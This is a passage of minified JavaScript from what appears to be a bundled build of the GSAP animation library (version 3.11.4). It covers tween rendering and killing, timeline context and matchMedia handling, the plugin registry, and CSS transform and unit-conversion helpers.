            ((l._tTime = -Ce), l.render(Math.max(0, -u) || 0)),
            y && V5(F1(l), y),
            l
        );
    }
    E5(e, r);
    var t = e.prototype;
    return (
        (t.render = function(i, s, o) {
            var f,
                d,
                m,
                p,
                y,
                v,
                S,
                w,
                C,
                l = this._time,
                a = this._tDur,
                c = this._dur,
                u = i < 0,
                h = i > a - Ce && !u ? a : i < Ce ? 0 : i;
            if (c) {
                if (
                    h !== this._tTime ||
                    !i ||
                    o ||
                    (!this._initted && this._tTime) ||
                    (this._startAt && this._zTime < 0 !== u)
                ) {
                    if (((f = h), (w = this.timeline), this._repeat)) {
                        if (((p = c + this._rDelay), this._repeat < -1 && u))
                            return this.totalTime(100 * p + i, s, o);
                        if (
                            ((f = ct(h % p)),
                                h === a
                                    ? ((m = this._repeat), (f = c))
                                    : ((m = ~~(h / p)) && m === h / p && ((f = c), m--),
                                        f > c && (f = c)),
                                (v = this._yoyo && 1 & m) && ((C = this._yEase), (f = c - f)),
                                (y = dr(this._tTime, p)),
                                f === l && !o && this._initted)
                        )
                            return (this._tTime = h), this;
                        m !== y &&
                            (w && this._yEase && o4(w, v),
                                this.vars.repeatRefresh &&
                                !v &&
                                !this._lock &&
                                ((this._lock = o = 1),
                                    (this.render(ct(p * m), !0).invalidate()._lock = 0)));
                    }
                    if (!this._initted) {
                        if (j5(this, u ? i : f, o, s, h)) return (this._tTime = 0), this;
                        if (l !== this._time) return this;
                        if (c !== this._dur) return this.render(i, s, o);
                    }
                    if (
                        ((this._tTime = h),
                            (this._time = f),
                            !this._act && this._ts && ((this._act = 1), (this._lazy = 0)),
                            (this.ratio = S = (C || this._ease)(f / c)),
                            this._from && (this.ratio = S = 1 - S),
                            f && !l && !s && (e1(this, "onStart"), this._tTime !== h))
                    )
                        return this;
                    for (d = this._pt; d;) d.r(S, d.d), (d = d._next);
                    (w &&
                        w.render(
                            i < 0 ? i : !f && v ? -Ce : w._dur * w._ease(f / this._dur),
                            s,
                            o
                        )) ||
                        (this._startAt && (this._zTime = i)),
                        this._onUpdate &&
                        !s &&
                        (u && di(this, i, s, o), e1(this, "onUpdate")),
                        this._repeat &&
                        m !== y &&
                        this.vars.onRepeat &&
                        !s &&
                        this.parent &&
                        e1(this, "onRepeat"),
                        (h === this._tDur || !h) &&
                        this._tTime === h &&
                        (u && !this._onUpdate && di(this, i, !0, !0),
                            (i || !c) &&
                            ((h === this._tDur && this._ts > 0) || (!h && this._ts < 0)) &&
                            c3(this, 1),
                            !s &&
                            (!u || l) &&
                            (h || l || v) &&
                            (e1(this, h === a ? "onComplete" : "onReverseComplete", !0),
                                this._prom &&
                                !(h < a && this.timeScale() > 0) &&
                                this._prom()));
                }
            } else il(this, i, s, o);
            return this;
        }),
        (t.targets = function() {
            return this._targets;
        }),
        (t.invalidate = function(i) {
            return (
                (!i || !this.vars.runBackwards) && (this._startAt = 0),
                (this._pt = this._op = this._onUpdate = this._lazy = this.ratio = 0),
                (this._ptLookup = []),
                this.timeline && this.timeline.invalidate(i),
                r.prototype.invalidate.call(this, i)
            );
        }),
        (t.resetTo = function(i, s, o, l) {
            an || $t.wake(), this._ts || this.play();
            var c,
                a = Math.min(this._dur, (this._dp._time - this._start) * this._ts);
            return (
                this._initted || c6(this, a),
                (c = this._ease(a / this._dur)),
                Cl(this, i, s, o, l, c, a)
                    ? this.resetTo(i, s, o, l)
                    : (S2(this, 0),
                        this.parent ||
                        Y5(
                            this._dp,
                            this,
                            "_first",
                            "_last",
                            this._dp._sort ? "_start" : 0
                        ),
                        this.render(0))
            );
        }),
        (t.kill = function(i, s) {
            if ((void 0 === s && (s = "all"), !(i || (s && "all" !== s))))
                return (this._lazy = this._pt = 0), this.parent ? Ir(this) : this;
            if (this.timeline) {
                var o = this.timeline.totalDuration();
                return (
                    this.timeline.killTweensOf(i, s, Q1 && !0 !== Q1.vars.overwrite)
                        ._first || Ir(this),
                    this.parent &&
                    o !== this.timeline.totalDuration() &&
                    _r(this, (this._dur * this.timeline._tDur) / o, 0, 1),
                    this
                );
            }
            var h,
                f,
                d,
                m,
                p,
                y,
                v,
                l = this._targets,
                a = i ? Jt(i) : l,
                c = this._ptLookup,
                u = this._pt;
            if ((!s || "all" === s) && el(l, a))
                return "all" === s && (this._pt = 0), Ir(this);
            for (
                h = this._op = this._op || [],
                "all" !== s &&
                (it(s) &&
                    ((p = {}),
                        Dt(s, function(S) {
                            return (p[S] = 1);
                        }),
                        (s = p)),
                    (s = Sl(l, s))),
                v = l.length;
                v--;

            )
                if (~a.indexOf(l[v]))
                    for (p in ((f = c[v]),
                        "all" === s
                            ? ((h[v] = s), (m = f), (d = {}))
                            : ((d = h[v] = h[v] || {}), (m = s)),
                        m))
                        (y = f && f[p]) &&
                            ((!("kill" in y.d) || !0 === y.d.kill(p)) && T2(this, y, "_pt"),
                                delete f[p]),
                            "all" !== d && (d[p] = 1);
            return this._initted && !this._pt && u && Ir(this), this;
        }),
        (e.to = function(i, s) {
            return new e(i, s, arguments[2]);
        }),
        (e.from = function(i, s) {
            return Ur(1, arguments);
        }),
        (e.delayedCall = function(i, s, o, l) {
            return new e(s, 0, {
                immediateRender: !1,
                lazy: !1,
                overwrite: !1,
                delay: i,
                onComplete: s,
                onReverseComplete: s,
                onCompleteParams: o,
                onReverseCompleteParams: o,
                callbackScope: l,
            });
        }),
        (e.fromTo = function(i, s, o) {
            return Ur(2, arguments);
        }),
        (e.set = function(i, s) {
            return (s.duration = 0), s.repeatDelay || (s.repeat = 0), new e(i, s);
        }),
        (e.killTweensOf = function(i, s, o) {
            return Ee.killTweensOf(i, s, o);
        }),
        e
    );
})(gr);
r1(Ke.prototype, { _targets: [], _lazy: 0, _startAt: 0, _op: 0, _onInit: 0 }),
    Dt("staggerTo,staggerFrom,staggerFromTo", function(r) {
        Ke[r] = function() {
            var e = new Rt(),
                t = pi.call(arguments, 0);
            return t.splice("staggerFromTo" === r ? 5 : 4, 0, 0), e[r].apply(e, t);
        };
    });
var u6 = function(e, t, n) {
    return (e[t] = n);
},
    h4 = function(e, t, n) {
        return e[t](n);
    },
    Ol = function(e, t, n, i) {
        return e[t](i.fp, n);
    },
    Pl = function(e, t, n) {
        return e.setAttribute(t, n);
    },
    f6 = function(e, t) {
        return Le(e[t]) ? h4 : r6(e[t]) && e.setAttribute ? Pl : u6;
    },
    d4 = function(e, t) {
        return t.set(t.t, t.p, Math.round(1e6 * (t.s + t.c * e)) / 1e6, t);
    },
    Ml = function(e, t) {
        return t.set(t.t, t.p, !!(t.s + t.c * e), t);
    },
    _4 = function(e, t) {
        var n = t._pt,
            i = "";
        if (!e && t.b) i = t.b;
        else if (1 === e && t.e) i = t.e;
        else {
            for (; n;)
                (i =
                    n.p +
                    (n.m ? n.m(n.s + n.c * e) : Math.round(1e4 * (n.s + n.c * e)) / 1e4) +
                    i),
                    (n = n._next);
            i += t.c;
        }
        t.set(t.t, t.p, i, t);
    },
    h6 = function(e, t) {
        for (var n = t._pt; n;) n.r(e, n.d), (n = n._next);
    },
    El = function(e, t, n, i) {
        for (var o, s = this._pt; s;)
            (o = s._next), s.p === i && s.modifier(e, t, n), (s = o);
    },
    kl = function(e) {
        for (var n, i, t = this._pt; t;)
            (i = t._next),
                (t.p === e && !t.op) || t.op === e
                    ? T2(this, t, "_pt")
                    : t.dep || (n = 1),
                (t = i);
        return !n;
    },
    Rl = function(e, t, n, i) {
        i.mSet(e, t, i.m.call(i.tween, n, i.mt), i);
    },
    p4 = function(e) {
        for (var n, i, s, o, t = e._pt; t;) {
            for (n = t._next, i = s; i && i.pr > t.pr;) i = i._next;
            (t._prev = i ? i._prev : o) ? (t._prev._next = t) : (s = t),
                (t._next = i) ? (i._prev = t) : (o = t),
                (t = n);
        }
        e._pt = s;
    },
    Ft = (function() {
        function r(t, n, i, s, o, l, a, c, u) {
            (this.t = n),
                (this.s = s),
                (this.c = o),
                (this.p = i),
                (this.r = l || d4),
                (this.d = a || this),
                (this.set = c || u6),
                (this.pr = u || 0),
                (this._next = t),
                t && (t._prev = this);
        }
        return (
            (r.prototype.modifier = function(n, i, s) {
                (this.mSet = this.mSet || this.set),
                    (this.set = Rl),
                    (this.m = n),
                    (this.mt = s),
                    (this.tween = i);
            }),
            r
        );
    })();
Dt(
    o6 +
    "parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger",
    function(r) {
        return (s6[r] = 1);
    }
),
    (Yt.TweenMax = Yt.TweenLite = Ke),
    (Yt.TimelineLite = Yt.TimelineMax = Rt),
    (Ee = new Rt({
        sortChildren: !1,
        defaults: hr,
        autoRemoveChildren: !0,
        id: "root",
        smoothChildTiming: !0,
    })),
    (Wt.stringFilter = i4);
var mr = [],
    Un = {},
    Il = [],
    us = 0,
    Z2 = function(e) {
        return (Un[e] || Il).map(function(t) {
            return t();
        });
    },
    yi = function() {
        var e = Date.now(),
            t = [];
        e - us > 2 &&
            (Z2("matchMediaInit"),
                mr.forEach(function(n) {
                    var o,
                        l,
                        a,
                        c,
                        i = n.queries,
                        s = n.conditions;
                    for (l in i)
                        (o = Kt.matchMedia(i[l]).matches) && (a = 1),
                            o !== s[l] && ((s[l] = o), (c = 1));
                    c && (n.revert(), a && t.push(n));
                }),
                Z2("matchMediaRevert"),
                t.forEach(function(n) {
                    return n.onMatch(n);
                }),
                (us = e),
                Z2("matchMedia"));
    },
    g4 = (function() {
        function r(t, n) {
            (this.selector = n && gi(n)),
                (this.data = []),
                (this._r = []),
                (this.isReverted = !1),
                t && this.add(t);
        }
        var e = r.prototype;
        return (
            (e.add = function(n, i, s) {
                Le(n) && ((s = i), (i = n), (n = Le));
                var o = this,
                    l = function() {
                        var h,
                            c = Ye,
                            u = o.selector;
                        return (
                            c && c !== o && c.data.push(o),
                            s && (o.selector = gi(s)),
                            (Ye = o),
                            (h = i.apply(o, arguments)),
                            Le(h) && o._r.push(h),
                            (Ye = c),
                            (o.selector = u),
                            (o.isReverted = !1),
                            h
                        );
                    };
                return (o.last = l), n === Le ? l(o) : n ? (o[n] = l) : l;
            }),
            (e.ignore = function(n) {
                var i = Ye;
                (Ye = null), n(this), (Ye = i);
            }),
            (e.getTweens = function() {
                var n = [];
                return (
                    this.data.forEach(function(i) {
                        return i instanceof r
                            ? n.push.apply(n, i.getTweens())
                            : i instanceof Ke &&
                            !(i.parent && "nested" === i.parent.data) &&
                            n.push(i);
                    }),
                    n
                );
            }),
            (e.clear = function() {
                this._r.length = this.data.length = 0;
            }),
            (e.kill = function(n, i) {
                var s = this;
                if (n) {
                    var o = this.getTweens();
                    this.data.forEach(function(a) {
                        "isFlip" === a.data &&
                            (a.revert(),
                                a.getChildren(!0, !0, !1).forEach(function(c) {
                                    return o.splice(o.indexOf(c), 1);
                                }));
                    }),
                        o
                            .map(function(a) {
                                return { g: a.globalTime(0), t: a };
                            })
                            .sort(function(a, c) {
                                return c.g - a.g || -1;
                            })
                            .forEach(function(a) {
                                return a.t.revert(n);
                            }),
                        this.data.forEach(function(a) {
                            return !(a instanceof gr) && a.revert && a.revert(n);
                        }),
                        this._r.forEach(function(a) {
                            return a(n, s);
                        }),
                        (this.isReverted = !0);
                } else
                    this.data.forEach(function(a) {
                        return a.kill && a.kill();
                    });
                if ((this.clear(), i)) {
                    var l = mr.indexOf(this);
                    ~l && mr.splice(l, 1);
                }
            }),
            (e.revert = function(n) {
                this.kill(n || {});
            }),
            r
        );
    })(),
    Dl = (function() {
        function r(t) {
            (this.contexts = []), (this.scope = t);
        }
        var e = r.prototype;
        return (
            (e.add = function(n, i, s) {
                M1(n) || (n = { matches: n });
                var a,
                    c,
                    u,
                    o = new g4(0, s || this.scope),
                    l = (o.conditions = {});
                for (c in (this.contexts.push(o),
                    (i = o.add("onMatch", i)),
                    (o.queries = n),
                    n))
                    "all" === c
                        ? (u = 1)
                        : (a = Kt.matchMedia(n[c])) &&
                        (mr.indexOf(o) < 0 && mr.push(o),
                            (l[c] = a.matches) && (u = 1),
                            a.addListener
                                ? a.addListener(yi)
                                : a.addEventListener("change", yi));
                return u && i(o), this;
            }),
            (e.revert = function(n) {
                this.kill(n || {});
            }),
            (e.kill = function(n) {
                this.contexts.forEach(function(i) {
                    return i.kill(n, !0);
                });
            }),
            r
        );
    })(),
    s2 = {
        registerPlugin: function() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
                t[n] = arguments[n];
            t.forEach(function(i) {
                return pl(i);
            });
        },
        timeline: function(e) {
            return new Rt(e);
        },
        getTweensOf: function(e, t) {
            return Ee.getTweensOf(e, t);
        },
        getProperty: function(e, t, n, i) {
            it(e) && (e = Jt(e)[0]);
            var s = E3(e || {}).get,
                o = n ? H5 : W5;
            return (
                "native" === n && (n = ""),
                e &&
                (t
                    ? o(((Zt[t] && Zt[t].get) || s)(e, t, n, i))
                    : function(l, a, c) {
                        return o(((Zt[l] && Zt[l].get) || s)(e, l, a, c));
                    })
            );
        },
        quickSetter: function(e, t, n) {
            if ((e = Jt(e)).length > 1) {
                var i = e.map(function(u) {
                    return Xt.quickSetter(u, t, n);
                }),
                    s = i.length;
                return function(u) {
                    for (var h = s; h--;) i[h](u);
                };
            }
            e = e[0] || {};
            var o = Zt[t],
                l = E3(e),
                a = (l.harness && (l.harness.aliases || {})[t]) || t,
                c = o
                    ? function(u) {
                        var h = new o();
                        (G3._pt = 0),
                            h.init(e, n ? u + n : u, G3, 0, [e]),
                            h.render(1, h),
                            G3._pt && h6(1, G3);
                    }
                    : l.set(e, a);
            return o
                ? c
                : function(u) {
                    return c(e, a, n ? u + n : u, l, 1);
                };
        },
        quickTo: function(e, t, n) {
            var i,
                s = Xt.to(
                    e,
                    B3((((i = {})[t] = "+=0.1"), (i.paused = !0), i), n || {})
                ),
                o = function(a, c, u) {
                    return s.resetTo(t, a, c, u);
                };
            return (o.tween = s), o;
        },
        isTweening: function(e) {
            return Ee.getTweensOf(e, !0).length > 0;
        },
        defaults: function(e) {
            return e && e.ease && (e.ease = R3(e.ease, hr.ease)), ss(hr, e || {});
        },
        config: function(e) {
            return ss(Wt, e || {});
        },
        registerEffect: function(e) {
            var t = e.name,
                n = e.effect,
                i = e.plugins,
                s = e.defaults,
                o = e.extendTimeline;
            (i || "").split(",").forEach(function(l) {
                return (
                    l && !Zt[l] && !Yt[l] && t2(t + " effect requires " + l + " plugin.")
                );
            }),
                (F2[t] = function(l, a, c) {
                    return n(Jt(l), r1(a || {}, s), c);
                }),
                o &&
                (Rt.prototype[t] = function(l, a, c) {
                    return this.add(F2[t](l, M1(a) ? a : (c = a) && {}, this), c);
                });
        },
        registerEase: function(e, t) {
            pe[e] = R3(t);
        },
        parseEase: function(e, t) {
            return arguments.length ? R3(e, t) : pe;
        },
        getById: function(e) {
            return Ee.getById(e);
        },
        exportRoot: function(e, t) {
            void 0 === e && (e = {});
            var i,
                s,
                n = new Rt(e);
            for (
                n.smoothChildTiming = It(e.smoothChildTiming),
                Ee.remove(n),
                n._dp = 0,
                n._time = n._tTime = Ee._time,
                i = Ee._first;
                i;

            )
                (s = i._next),
                    (t ||
                        !(
                            !i._dur &&
                            i instanceof Ke &&
                            i.vars.onComplete === i._targets[0]
                        )) &&
                    S1(n, i, i._start - i._delay),
                    (i = s);
            return S1(Ee, n, 0), n;
        },
        context: function(e, t) {
            return e ? new g4(e, t) : Ye;
        },
        matchMedia: function(e) {
            return new Dl(e);
        },
        matchMediaRefresh: function() {
            return (
                mr.forEach(function(e) {
                    var n,
                        i,
                        t = e.conditions;
                    for (i in t) t[i] && ((t[i] = !1), (n = 1));
                    n && e.revert();
                }) || yi()
            );
        },
        addEventListener: function(e, t) {
            var n = Un[e] || (Un[e] = []);
            ~n.indexOf(t) || n.push(t);
        },
        removeEventListener: function(e, t) {
            var n = Un[e],
                i = n && n.indexOf(t);
            i >= 0 && n.splice(i, 1);
        },
        utils: {
            wrap: hl,
            wrapYoyo: dl,
            distribute: Q5,
            random: J5,
            snap: G5,
            normalize: fl,
            getUnit: pt,
            clamp: ll,
            splitColor: r4,
            toArray: Jt,
            selector: gi,
            mapRange: t4,
            pipe: cl,
            unitize: ul,
            interpolate: _l,
            shuffle: q5,
        },
        install: N5,
        effects: F2,
        ticker: $t,
        updateRoot: Rt.updateRoot,
        plugins: Zt,
        globalTimeline: Ee,
        core: {
            PropTween: Ft,
            globals: Z5,
            Tween: Ke,
            Timeline: Rt,
            Animation: gr,
            getCache: E3,
            _removeLinkedListItem: T2,
            reverting: function() {
                return mt;
            },
            context: function(e) {
                return e && Ye && (Ye.data.push(e), (e._ctx = Ye)), Ye;
            },
            suppressOverwrites: function(e) {
                return (t6 = e);
            },
        },
    };
Dt("to,from,fromTo,delayedCall,set,killTweensOf", function(r) {
    return (s2[r] = Ke[r]);
}),
    $t.add(Rt.updateRoot),
    (G3 = s2.to({}, { duration: 0 }));
var Fl = function(e, t) {
    for (var n = e._pt; n && n.p !== t && n.op !== t && n.fp !== t;)
        n = n._next;
    return n;
},
    Bl = function(e, t) {
        var i,
            s,
            o,
            n = e._targets;
        for (i in t)
            for (s = n.length; s--;)
                (o = e._ptLookup[s][i]) &&
                    (o = o.d) &&
                    (o._pt && (o = Fl(o, i)),
                        o && o.modifier && o.modifier(t[i], e, n[s], i));
    },
    $2 = function(e, t) {
        return {
            name: e,
            rawVars: 1,
            init: function(i, s, o) {
                o._onInit = function(l) {
                    var a, c;
                    if (
                        (it(s) &&
                            ((a = {}),
                                Dt(s, function(u) {
                                    return (a[u] = 1);
                                }),
                                (s = a)),
                            t)
                    ) {
                        for (c in ((a = {}), s)) a[c] = t(s[c]);
                        s = a;
                    }
                    Bl(l, s);
                };
            },
        };
    },
    Xt =
        s2.registerPlugin(
            {
                name: "attr",
                init: function(e, t, n, i, s) {
                    var o, l, a;
                    for (o in ((this.tween = n), t))
                        (a = e.getAttribute(o) || ""),
                            ((l = this.add(
                                e,
                                "setAttribute",
                                (a || 0) + "",
                                t[o],
                                i,
                                s,
                                0,
                                0,
                                o
                            )).op = o),
                            (l.b = a),
                            this._props.push(o);
                },
                render: function(e, t) {
                    for (var n = t._pt; n;)
                        mt ? n.set(n.t, n.p, n.b, n) : n.r(e, n.d), (n = n._next);
                },
            },
            {
                name: "endArray",
                init: function(e, t) {
                    for (var n = t.length; n--;)
                        this.add(e, n, e[n] || 0, t[n], 0, 0, 0, 0, 0, 1);
                },
            },
            $2("roundProps", mi),
            $2("modifiers"),
            $2("snap", G5)
        ) || s2;
(Ke.version = Rt.version = Xt.version = "3.11.4"),
    (L5 = 1),
    R5() && pr(),
    pe.Power0,
    pe.Power1,
    pe.Power2,
    pe.Power3,
    pe.Power4,
    pe.Linear,
    pe.Quad,
    pe.Cubic,
    pe.Quart,
    pe.Quint,
    pe.Strong,
    pe.Elastic,
    pe.Back,
    pe.SteppedEase,
    pe.Bounce,
    pe.Sine,
    pe.Expo,
    pe.Circ;
var fs,
    G1,
    sr,
    d6,
    A3,
    hs,
    _6,
    b4,
    Ll = function() {
        return typeof window < "u";
    },
    W1 = {},
    w3 = 180 / Math.PI,
    or = Math.PI / 180,
    Y3 = Math.atan2,
    ds = 1e8,
    p6 = /([A-Z])/g,
    Nl = /(left|right|width|margin|padding|x)/i,
    Zl = /[\s,\(]\S/,
    Z1 = {
        autoAlpha: "opacity,visibility",
        scale: "scaleX,scaleY",
        alpha: "opacity",
    },
    vi = function(e, t) {
        return t.set(t.t, t.p, Math.round(1e4 * (t.s + t.c * e)) / 1e4 + t.u, t);
    },
    $l = function(e, t) {
        return t.set(
            t.t,
            t.p,
            1 === e ? t.e : Math.round(1e4 * (t.s + t.c * e)) / 1e4 + t.u,
            t
        );
    },
    zl = function(e, t) {
        return t.set(
            t.t,
            t.p,
            e ? Math.round(1e4 * (t.s + t.c * e)) / 1e4 + t.u : t.b,
            t
        );
    },
    Ul = function(e, t) {
        var n = t.s + t.c * e;
        t.set(t.t, t.p, ~~(n + (n < 0 ? -0.5 : 0.5)) + t.u, t);
    },
    m4 = function(e, t) {
        return t.set(t.t, t.p, e ? t.e : t.b, t);
    },
    x4 = function(e, t) {
        return t.set(t.t, t.p, 1 !== e ? t.b : t.e, t);
    },
    Wl = function(e, t, n) {
        return (e.style[t] = n);
    },
    Hl = function(e, t, n) {
        return e.style.setProperty(t, n);
    },
    Yl = function(e, t, n) {
        return (e._gsap[t] = n);
    },
    Xl = function(e, t, n) {
        return (e._gsap.scaleX = e._gsap.scaleY = n);
    },
    Vl = function(e, t, n, i, s) {
        var o = e._gsap;
        (o.scaleX = o.scaleY = n), o.renderTransform(s, o);
    },
    jl = function(e, t, n, i, s) {
        var o = e._gsap;
        (o[t] = n), o.renderTransform(s, o);
    },
    ke = "transform",
    g1 = ke + "Origin",
    Kl = function(e, t) {
        var n = this,
            i = this.target,
            s = i.style;
        if (e in W1) {
            if (
                ((this.tfm = this.tfm || {}),
                    "transform" !== e &&
                    (~(e = Z1[e] || e).indexOf(",")
                        ? e.split(",").forEach(function(o) {
                            return (n.tfm[o] = L1(i, o));
                        })
                        : (this.tfm[e] = i._gsap.x ? i._gsap[e] : L1(i, e))),
                    this.props.indexOf(ke) >= 0)
            )
                return;
            i._gsap.svg &&
                ((this.svgo = i.getAttribute("data-svg-origin")),
                    this.props.push(g1, t, "")),
                (e = ke);
        }
        (s || t) && this.props.push(e, t, s[e]);
    },
    y4 = function(e) {
        e.translate &&
            (e.removeProperty("translate"),
                e.removeProperty("scale"),
                e.removeProperty("rotate"));
    },
    ql = function() {
        var s,
            o,
            e = this.props,
            t = this.target,
            n = t.style,
            i = t._gsap;
        for (s = 0; s < e.length; s += 3)
            e[s + 1]
                ? (t[e[s]] = e[s + 2])
                : e[s + 2]
                    ? (n[e[s]] = e[s + 2])
                    : n.removeProperty(e[s].replace(p6, "-$1").toLowerCase());
        if (this.tfm) {
            for (o in this.tfm) i[o] = this.tfm[o];
            i.svg &&
                (i.renderTransform(),
                    t.setAttribute("data-svg-origin", this.svgo || "")),
                (s = _6()) && !s.isStart && !n[ke] && (y4(n), (i.uncache = 1));
        }
    },
    v4 = function(e, t) {
        var n = { target: e, props: [], revert: ql, save: Kl };
        return (
            t &&
            t.split(",").forEach(function(i) {
                return n.save(i);
            }),
            n
        );
    },
    bi = function(e, t) {
        var n = G1.createElementNS
            ? G1.createElementNS(
                (t || "http://www.w3.org/1999/xhtml").replace(/^https/, "http"),
                e
            )
            : G1.createElement(e);
        return n.style ? n : G1.createElement(e);
    },
    A1 = function r(e, t, n) {
        var i = getComputedStyle(e);
        return (
            i[t] ||
            i.getPropertyValue(t.replace(p6, "-$1").toLowerCase()) ||
            i.getPropertyValue(t) ||
            (!n && r(e, xr(t) || t, 1)) ||
            ""
        );
    },
    _s = "O,Moz,ms,Ms,Webkit".split(","),
    xr = function(e, t, n) {
        var s = (t || A3).style,
            o = 5;
        if (e in s && !n) return e;
        for (
            e = e.charAt(0).toUpperCase() + e.substr(1);
            o-- && !(_s[o] + e in s);

        );
        return o < 0 ? null : (3 === o ? "ms" : o >= 0 ? _s[o] : "") + e;
    },
    wi = function() {
        Ll() &&
            window.document &&
            ((fs = window),
                (G1 = fs.document),
                (sr = G1.documentElement),
                (A3 = bi("div") || { style: {} }),
                bi("div"),
                (ke = xr(ke)),
                (g1 = ke + "Origin"),
                (A3.style.cssText =
                    "border-width:0;line-height:0;position:absolute;padding:0"),
                (b4 = !!xr("perspective")),
                (_6 = Xt.core.reverting),
                (d6 = 1));
    },
    z2 = function r(e) {
        var o,
            t = bi(
                "svg",
                (this.ownerSVGElement && this.ownerSVGElement.getAttribute("xmlns")) ||
                "http://www.w3.org/2000/svg"
            ),
            n = this.parentNode,
            i = this.nextSibling,
            s = this.style.cssText;
        if (
            (sr.appendChild(t),
                t.appendChild(this),
                (this.style.display = "block"),
                e)
        )
            try {
                (o = this.getBBox()),
                    (this._gsapBBox = this.getBBox),
                    (this.getBBox = r);
            } catch { }
        else this._gsapBBox && (o = this._gsapBBox());
        return (
            n && (i ? n.insertBefore(this, i) : n.appendChild(this)),
            sr.removeChild(t),
            (this.style.cssText = s),
            o
        );
    },
    ps = function(e, t) {
        for (var n = t.length; n--;)
            if (e.hasAttribute(t[n])) return e.getAttribute(t[n]);
    },
    w4 = function(e) {
        var t;
        try {
            t = e.getBBox();
        } catch {
            t = z2.call(e, !0);
        }
        return (
            (t && (t.width || t.height)) || e.getBBox === z2 || (t = z2.call(e, !0)),
            !t || t.width || t.x || t.y
                ? t
                : {
                    x: +ps(e, ["x", "cx", "x1"]) || 0,
                    y: +ps(e, ["y", "cy", "y1"]) || 0,
                    width: 0,
                    height: 0,
                }
        );
    },
    T4 = function(e) {
        return !(!e.getCTM || (e.parentNode && !e.ownerSVGElement) || !w4(e));
    },
    cn = function(e, t) {
        if (t) {
            var n = e.style;
            t in W1 && t !== g1 && (t = ke),
                n.removeProperty
                    ? (("ms" === t.substr(0, 2) || "webkit" === t.substr(0, 6)) &&
                        (t = "-" + t),
                        n.removeProperty(t.replace(p6, "-$1").toLowerCase()))
                    : n.removeAttribute(t);
        }
    },
    J1 = function(e, t, n, i, s, o) {
        var l = new Ft(e._pt, t, n, 0, 1, o ? x4 : m4);
        return (e._pt = l), (l.b = i), (l.e = s), e._props.push(n), l;
    },
    gs = { deg: 1, rad: 1, turn: 1 },
    Ql = { grid: 1, flex: 1 },
    u3 = function r(e, t, n, i) {
        var m,
            p,
            y,
            v,
            s = parseFloat(n) || 0,
            o = (n + "").trim().substr((s + "").length) || "px",
            l = A3.style,
            a = Nl.test(t),
            c = "svg" === e.tagName.toLowerCase(),
            u = (c ? "client" : "offset") + (a ? "Width" : "Height"),
            h = 100,
            f = "px" === i,
            d = "%" === i;
        return i === o || !s || gs[i] || gs[o]
            ? s
            : ("px" !== o && !f && (s = r(e, t, n, "px")),
                (v = e.getCTM && T4(e)),
                (!d && "%" !== o) || (!W1[t] && !~t.indexOf("adius"))
                    ? ((l[a ? "width" : "height"] = h + (f ? o : i)),
                        (p =
                            ~t.indexOf("adius") || ("em" === i && e.appendChild && !c)
                                ? e
                                : e.parentNode),
                        v && (p = (e.ownerSVGElement || {}).parentNode),
                        (!p || p === G1 || !p.appendChild) && (p = G1.body),
                        (y = p._gsap) &&
                            d &&
                            y.width &&
                            a &&
                            y.time === $t.time &&
                            !y.uncache
                            ? ze((s / y.width) * h)
                            : ((d || "%" === o) &&
                                !Ql[A1(p, "display")] &&
                                (l.position = A1(e, "position")),
                                p === e && (l.position = "static"),
                                p.appendChild(A3),
                                (m = A3[u]),
                                p.removeChild(A3),
                                (l.position = "absolute"),
                                a && d && (((y = E3(p)).time = $t.time), (y.width = p[u])),
                                ze(f ? (m * s) / h : m && s ? (h / m) * s : 0)))
                    : ((m = v ? e.getBBox()[a ? "width" : "height"] : e[u]),
                        ze(d ? (s / m) * h : (s / 100) * m)));
    },
    L1 = function(e, t, n, i) {
        var s;
        return (
            d6 || wi(),
            t in Z1 &&
            "transform" !== t &&
            ~(t = Z1[t]).indexOf(",") &&
            (t = t.split(",")[0]),
            W1[t] && "transform" !== t
                ? ((s = fn(e, i)),
                    (s =
                        "transformOrigin" !== t
                            ? s[t]
                            : s.svg
                                ? s.origin
                                : l2(A1(e, g1)) + " " + s.zOrigin + "px"))
                : (!(s = e.style[t]) ||
                    "auto" === s ||
                    i ||
                    ~(s + "").indexOf("calc(")) &&
                (s =
                    (o2[t] && o2[t](e, t, n)) ||
                    A1(e, t) ||
                    z5(e, t) ||
                    ("opacity" === t ? 1 : 0)),
            n && !~(s + "").trim().indexOf(" ") ? u3(e, t, s, n) + n : s
        );
    },
    Gl = function(e, t, n, i) {
        if (!n || "none" === n) {
            var s = xr(t, e, 1),
                o = s && A1(e, s, 1);
            o && o !== n
                ? ((t = s), (n = o))
                : "borderColor" === t && (n = A1(e, "borderTopColor"));
        }
        var u,
            h,
            f,
            d,
            m,
            p,
            y,
            v,
            S,
            w,
            C,
            l = new Ft(this._pt, e.style, t, 0, 1, _4),
            a = 0,
            c = 0;
        if (
            ((l.b = n),
                (l.e = i),
                (n += ""),
                "auto" === (i += "") &&
                ((e.style[t] = i), (i = A1(e, t) || i), (e.style[t] = n)),
                i4((u = [n, i])),
                (i = u[1]),
                (f = (n = u[0]).match(Q3) || []),
                (i.match(Q3) || []).length)
        ) {
            for (; (h = Q3.exec(i));)
                (y = h[0]),
                    (S = i.substring(a, h.index)),
                    m
                        ? (m = (m + 1) % 5)
                        : ("rgba(" === S.substr(-5) || "hsla(" === S.substr(-5)) && (m = 1),
                    y !== (p = f[c++] || "") &&
                    ((d = parseFloat(p) || 0),
                        (C = p.substr((d + "").length)),
                        "=" === y.charAt(1) && (y = ir(d, y) + C),
                        (v = parseFloat(y)),
                        (w = y.substr((v + "").length)),
                        (a = Q3.lastIndex - w.length),
                        w ||
                        ((w = w || Wt.units[t] || C),
                            a === i.length && ((i += w), (l.e += w))),
                        C !== w && (d = u3(e, t, p, w) || 0),
                        (l._pt = {
                            _next: l._pt,
                            p: S || 1 === c ? S : ",",
                            s: d,
                            c: v - d,
                            m: (m && m < 4) || "zIndex" === t ? Math.round : 0,
                        }));
            l.c = a < i.length ? i.substring(a, i.length) : "";
        } else l.r = "display" === t && "none" === i ? x4 : m4;
        return F5.test(i) && (l.e = 0), (this._pt = l), l;
    },
    ms = { top: "0%", bottom: "100%", left: "0%", right: "100%", center: "50%" },
    Jl = function(e) {
        var t = e.split(" "),
            n = t[0],
            i = t[1] || "50%";
        return (
            ("top" === n || "bottom" === n || "left" === i || "right" === i) &&
            ((e = n), (n = i), (i = e)),
            (t[0] = ms[n] || n),
